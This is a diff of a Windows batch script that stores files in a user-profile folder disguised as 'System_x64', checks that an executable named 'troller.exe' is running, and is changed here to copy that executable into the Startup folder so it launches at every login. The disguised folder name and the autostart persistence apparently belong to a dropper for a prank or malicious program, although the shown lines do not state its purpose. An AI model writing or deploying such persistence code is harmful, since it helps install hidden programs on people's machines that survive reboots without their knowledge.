@@ -1,5 +1,6 @@
 @echo off
 set DOWNLOAD_FOLDER=%userprofile%\System_x64
+set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
 :: create download folder if it doesn't exist
 if not exist "%DOWNLOAD_FOLDER%" (
@@ -34,8 +35,8 @@ timeout /t 5 /nobreak
 
 tasklist /fi "imagename eq troller.exe"
 
-:: ensure the script runs at startup
-copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+:: ensure the executable runs at startup
+copy "%DOWNLOAD_FOLDER%\troller.exe" "%STARTUP_FOLDER%"
 
-echo Files have been moved to System_x64 folder, troller.exe started, and script set to run at startup.
+echo Files have been moved to System_x64 folder, troller.exe started, and executable set to run at startup.
 pause
